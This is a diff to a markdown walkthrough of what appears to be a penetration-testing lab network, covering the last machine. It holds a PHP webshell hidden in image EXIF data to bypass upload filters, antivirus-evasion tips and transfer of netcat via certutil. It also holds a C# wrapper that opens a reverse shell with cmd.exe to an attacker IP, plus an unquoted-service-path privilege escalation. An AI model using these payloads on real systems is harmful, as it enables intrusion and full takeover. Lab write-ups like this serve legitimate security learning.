@@ -33,6 +33,8 @@ My OS : Kali GNU/Linux 2021.2
     2. [Exploiting vulnerability](#exploiting-vulnerability)
     3. [Bypassing the antivirus](#bypassing-the-antivirus)
     4. [Full reverse shell access](#full-reverse-shell)
+    5. [Enumeration from inside](#enumeration-from-inside)
+    6. [Privilege escalation](#privilege-escalation)
 
 ## Gathered information about the network :
 
@@ -669,74 +671,157 @@ Powershell Empire has several major sections to it :
 		
 ## The last machine
     
-  ### Finding vulnerabilities
-    
-  Now we have access to Thomas website. We can just download the repository from the hard disk because we have local admin access to the git server. With our evil-winrm access 
-  we are able to locate absolute path to the website.git directory and use `download` command to download the whole directory. After 2 minutes your download should finish and 
-  a new directory should appear. Inside of it you should rename "Website.git" to ".git" because git repositories always contain a special directory called ".git". It contains 
-  all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and 
-  branches. 
-    
-  In order to extract the information from the repository we use a suite of tools called GitTools.
-  ```
-  git clone https://github.com/internetwache/GitTools
-  ```
-  The GitTools repository contains three tools :
-  - Dumper - can be used to download an exposed .git directory from a website
-  - Extractor - can be used to take a local .git directory and recreate the repository in readable format. This is designed to work in conjunction with the Dumper but will also 
-  work on the repo that we stole from the Git server.
-  - Finder - can be used to search the internet for sites with exposed .git directories. 
-    
-  ```
-  ./extractor.sh <REPO DIR> <DESTINATION DIR>
-  ```
-  The <REPO DIR> is the directory containing the .git directory for the repository. After this process we will have new files in specified <DESTINATION DIR> but those files 
-  (commits) are not sorted by date. It is up to us to piece together the order of the commits. Fortunately each of these commits comes with a `commit-meta.txt` file which we 
-  can read and get an idea of the order. Using `parent <HASH>` information we can get the full commit order :
-    
-  1. Static Website Commit
-  2. Initial Commit for the back-end
-  3. Updated the filter
-  
-  Now we can head into the last commit and search for some .php files as it is the webserver's back-end language. Using `find . -name "*.php"` we get only one result. If we are 
-  going to find a serious vulnerability it is going to have to be here. 
-  Inside of this file there are notes "ToDo" and we can read about "basic auth" filter that we will try to bypass and we also can get a look at filter itself. It is basic php 
-  script and we see that only picture files are accepted. In the line 4 we can see that the file will get moved into an `uploads/` directory with it's original name 
-  assuming it passed the two filters. Now we are ready to exploit this vulnerability.
-    
-  ### Exploiting Vulnerability
-  
-  Using your web browser let's head to the `/resources` directory. As we expected we are met with a request for authentication. Username is either `Thomas` or `twreath` and 
-  password we already gathered earlier. We are welcomed with the site to upload images of Thomas' cat.
-  
-  We already know that to bypass the first filter we need to change the extension to `.jpeg.php`. But the second filter is slightly harder because the getimagesize() function 
-  is checking for attributes that only an image will have. We need to upload a genuine image file which contains a PHP webshell somewhere. If this file has a .php extension 
-  then it will be executed by the website as a PHP file. 
-    
-  The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way. Take a random image and then 
-  check the exifdata of this file using `exiftool` . To add payload to our image we once again use exiftool  :  
-  ```
-	exiftool -Comment="<PHP PAYLOAD>" <NAME OF THE FILE>
-	```
-	
-	### Bypassing the antivirus	
-		
-	We now need to figure out how to make a PHP script that will bypass the antivirus software. What we need to do is build a payload that does what we need it to do, then we 
-	obfuscate it either manually or by using one of the many tools available online.
-		
-	Now there are a variety of measures we could take here, including but not limited to :
-		- Switching parts of the exploit around so that they're in an unusual order
-		- Encoding all of the strings so that they're not recognisable
-		- Splitting up distinctive parts of the code
-	For the sake of this experience we'll use online tool called php-obfuscator available at https://www.gaijin.at/en/tools/php-obfuscator . As this is getting passed into a bash 
-	command we will need to escape the dollar signs `$p0` -> `\$p0` and with that obfuscated payload we can finish off our exploit. This gives us possibility to execute commands 
-	through this webshell but let's get the full reverse shell.
-	
-	### Full Reverse Shell
+### Finding vulnerabilities
 
-	The quick and easy option to do this is to upload a netcat into target machine. Because the versions of netcat for Windows that comes with Kali is known to Defender we are 
-	going to use one of the versions from github ([this repository](https://github.com/int0x33/nc.exe/) )
+Now we have access to Thomas website. We can just download the repository from the hard disk because we have local admin access to the git server. With our evil-winrm access 
+we are able to locate absolute path to the website.git directory and use `download` command to download the whole directory. After 2 minutes your download should finish and 
+a new directory should appear. Inside of it you should rename "Website.git" to ".git" because git repositories always contain a special directory called ".git". It contains 
+all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and 
+branches. 
+
+In order to extract the information from the repository we use a suite of tools called GitTools.
+```
+git clone https://github.com/internetwache/GitTools
+```
+The GitTools repository contains three tools :
+- Dumper - can be used to download an exposed .git directory from a website
+- Extractor - can be used to take a local .git directory and recreate the repository in readable format. This is designed to work in conjunction with the Dumper but will also 
+work on the repo that we stole from the Git server.
+- Finder - can be used to search the internet for sites with exposed .git directories. 
+
+```
+./extractor.sh <REPO DIR> <DESTINATION DIR>
+```
+The <REPO DIR> is the directory containing the .git directory for the repository. After this process we will have new files in specified <DESTINATION DIR> but those files 
+(commits) are not sorted by date. It is up to us to piece together the order of the commits. Fortunately each of these commits comes with a `commit-meta.txt` file which we 
+can read and get an idea of the order. Using `parent <HASH>` information we can get the full commit order :
+
+
+1. Static Website Commit
+2. Initial Commit for the back-end
+3. Updated the filter
+
+
+Now we can head into the last commit and search for some .php files as it is the webserver's back-end language. Using `find . -name "*.php"` we get only one result. If we are 
+going to find a serious vulnerability it is going to have to be here. 
+Inside of this file there are notes "ToDo" and we can read about "basic auth" filter that we will try to bypass and we also can get a look at filter itself. It is basic php 
+script and we see that only picture files are accepted. In the line 4 we can see that the file will get moved into an `uploads/` directory with it's original name 
+assuming it passed the two filters. Now we are ready to exploit this vulnerability.
+    
+### Exploiting Vulnerability
+
+Using your web browser let's head to the `/resources` directory. As we expected we are met with a request for authentication. Username is either `Thomas` or `twreath` and 
+password we already gathered earlier. We are welcomed with the site to upload images of Thomas' cat.
+
+We already know that to bypass the first filter we need to change the extension to `.jpeg.php`. But the second filter is slightly harder because the getimagesize() function 
+is checking for attributes that only an image will have. We need to upload a genuine image file which contains a PHP webshell somewhere. If this file has a .php extension 
+then it will be executed by the website as a PHP file. 
+
+The easiest place to stick the shell is in the exifdata for the image -- specifically in the `Comment` field to keep it nicely out of the way. Take a random image and then 
+check the exifdata of this file using `exiftool` . To add payload to our image we once again use exiftool  :  
+`
+exiftool -Comment="<PHP-PAYLOAD>" <NAME-OF-THE-FILE>
+`
+
+### Bypassing the antivirus	
+
+We now need to figure out how to make a PHP script that will bypass the antivirus software. What we need to do is build a payload that does what we need it to do, then we 
+obfuscate it either manually or by using one of the many tools available online.
 		
+```
+		<?php 
+			$cmd = $_GET["wreath"];
+			if(isset($cmd)){
+				echo "<pre>" . shell_exec($cmd) . "</pre>";	
+			}
+			die();
+		?>
+```
+
+Now there are a variety of measures we could take here, including but not limited to :
+	- Switching parts of the exploit around so that they're in an unusual order
+	- Encoding all of the strings so that they're not recognisable
+	- Splitting up distinctive parts of the code
+For the sake of this experience we'll use online tool called php-obfuscator available at https://www.gaijin.at/en/tools/php-obfuscator . As this is getting passed into a bash 
+command we will need to escape the dollar signs `$p0` -> `\$p0` and with that obfuscated payload we can finish off our exploit. This gives us possibility to execute commands 
+through this webshell but let's get the full reverse shell.
+
+### Full Reverse Shell
+
+The quick and easy option to do this is to upload a netcat into target machine. Because the versions of netcat for Windows that comes with Kali is known to Defender we are 
+going to use one of the versions from github ([this repository](https://github.com/int0x33/nc.exe/) )
+		
+		---
+
+		#### Cross compilation
+		
+		It is an essential skill -- although in many ways it's preferable to avoid it. The idea is to compile source code into a working program to run on a different platform. 
+		Ideally we should always try to compile our code in an environment as close to the target environment as possible. Sometimes it's easiest to just cross-compile, however.
+		Generally speaking we cross compile x64 Windows programs on Kali using the `mingw-w64` package (for x64 systems). 
+		```
+		sudo apt install mingw-w64
+		```
+		Inside the directory we cloned we can use a makefile to compile the binary but we do have to make a small change. We need to comment out the first line and add another line 
+		underneath : `CC=x86_64-w64-mingw32-gcc` that will tell this file how to compile. With that out of our way we can just `file nc.exe` and we are done.
+		
+		---
+		
+Now when you get your binary compiled we need to transfer it. We start up our python server `python3 -m http.server 80` and choose a way to download this binary :
+		- Powershell might work but with AMSI in play it's a risk
+		- We could use the file upload point but this will be very painful
+		- We could look for other command line tools that we could use like `curl.exe` or `certutil.exe`
+You can test out the `certutil.exe` command in webshell and see that it de facto is installed on this host.
+		
+### Enumeration from inside
+		
+The only thing left is to enumerate this machine and potentially find a vulnerability that will give us full access. We'll start off with a little bit of manual enumeration :
+```
+whoami /priv
+whoami /groups
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+sc qc SystemExplorerHelpService
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+```
+Output of the third command gives us list of all services on the system and filters them so the only services left are not in the C:\Windows directory. There is a bunch of 
+results but the one called "SystemExplorerHelpService" is interesting because it lacks quotation marks around it. This indicates that it might be vulnerable to an `Unqoted 
+Service Path` attack. With the last command we are looking at "Access:" to see if we are able to write inside this service directory. Because we have full control and this
+service is running as the local system account we can easily make our own binary and not mess with the service itself.
+		
+### Privilege Escalation
+		
+Because of the fact that we already have netcat binary on target host we will go the easy way and just make a program that will execute this binary and give us the reverse 
+shell. We will start with installing Mono as our core compiler for Linux but it's up to you what you will use.
+```
+sudo apt install mono-devel
+nano Wrapper.cs
+
+namespace Wrapper{
+	class Program{
+		static void Main(){
+			Process proc = new Process();
+			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe, "10.50.156.24 445 -e cmd.exe");
+			procInfo.CreateNoWindows = true;
+			proc.StartInfo = procInfo;
+			proc.Start();
+		}
+	}
+}
+	
+msc Wrapper.cs
+```
+and just like this we have our compiler `Wrapper.exe` that we need to transfer to the target. Easy way is to use usual HTTP server and cURL. 
+		
+`Unquoted service path vulnerabilities` occur due to aspect of how Windows looks for files. If a path in Windows is not surrounded by quotes it will look for the executable 
+in the following order :
+		1. C:\Directory.exe
+		2. C:\Directory One\Directory.exe
+		3. C:\Directory One\Directory Two\Directory.exe
+We need to put this file in the place that we have write permissions in. Because of that we will use Direcotry \System Explorer\ and call our file `System.exe`. 
+		
+As this service starts automatically at boot we can try to stop the service and wait as it restarts itself `sc stop SystemExplorerHelpService`. After a while we will get that 
+root access and have access to the whole network.
+		
+Thank you for reading, it took long time to write it all down and learn myself. Have a nice day!
 		
 		
 		
